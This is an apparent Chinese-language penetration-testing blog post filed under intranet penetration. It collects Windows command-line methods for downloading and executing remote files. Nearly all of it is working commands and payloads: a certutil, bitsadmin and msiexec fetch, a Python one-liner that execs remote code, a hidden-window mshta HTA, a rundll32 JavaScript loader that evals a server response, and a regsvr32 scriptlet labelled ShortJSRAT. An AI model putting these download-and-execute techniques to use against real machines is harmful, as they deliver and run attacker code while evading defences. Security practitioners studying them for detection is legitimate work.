---
categories: 内网渗透
date: "2017-11-08T00:00:00Z"
title: Windows下命令行下载文件总结
url: /archivers/2017-11-08/1
---

## 0x00 Powershell

win2003、winXP不支持


$client = new-object System.Net.WebClient

$client.DownloadFile('http://payloads.online/file.tar.gz', 'E:\file.tar.gz')


## 0x01 ftp

ftp 192.168.3.2

输入用户名和密码后

lcd E:\file    # 进入E盘下的file目录

cd www # 进入服务器上的www目录

get access.log # 将服务器上的access.log下载到E:\file

可以参考：https://baike.baidu.com/item/ftp/13839

## 0x02 IPC$

copy \\192.168.3.1\c$\test.exe E:\file

可以参考：http://www.163164.com/jiqiao/163164com011.htm

## 0x03 Certutil

可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx

应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2

certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt

## 0x04 bitsadmin

可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx

* 1、`bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt`
* 2、`bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt`

## 0x05 msiexec

msiexec /q /i http://192.168.3.1/test.txt

## 0x06 IEExec

C:\Windows\Microsoft.NET\Framework\v2.0.50727\> caspol -s off

C:\Windows\Microsoft.NET\Framework\v2.0.50727\> IEExec http://192.168.3.1/test.exe

## 0x07 python

C:\python27\python.exe -c "import urllib2; exec urllib2.urlopen('http://192.168.3.1/test.zip').read();"

## 0x08 mshta

mshta http://192.168.3.1/run.hta

run.hta 内容如下：

```
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd.exe /c net user" // 这里填写命令
self.close
</script>
<body>
demo
</body>
</HEAD> 
</HTML>
```


## 0x09 rundll32

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}%
```

其实还是依赖于WScript.shell这个组件

## 0x10 regsvr32

regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll

test.data内容：
```
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="ShortJSRAT"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <!-- Learn from Casey Smith @subTee -->
    <script language="JScript">
        <![CDATA[
            ps  = "cmd.exe /c calc.exe";
            new ActiveXObject("WScript.Shell").Run(ps,0,true);

        ]]>
</script>
</registration>
</scriptlet>
```
 
还可以利用 https://github.com/CroweCybersecurity/ps1encode 生成sct(COM scriptlet - requires a webserver to stage the payload)

regsvr32 /u /s /i:http://192.168.3.1/test.sct scrobj.dll

## 结语

没有总结太多交互式下载文件的，这类的不太适用我们所遇到的场景，如果还有更多方式，后面再填补进来


